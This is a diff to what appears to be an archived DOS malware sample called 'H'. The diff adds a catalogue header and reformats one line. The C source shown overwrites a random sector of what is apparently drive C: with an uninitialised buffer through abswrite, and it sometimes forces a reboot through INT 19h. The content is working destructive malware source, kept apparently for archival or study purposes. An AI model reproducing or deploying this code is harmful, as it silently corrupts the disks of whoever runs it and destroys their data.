@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 #include <process.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -23,7 +34,8 @@ oldhandler();
 
 void main(void)
 {
-randomize();char buf[512];
+randomize();
+char buf[512];
 abswrite(2, 1, random(50000)+2000, buf);
 
 if(random(20) == 10)	asm	INT	19h
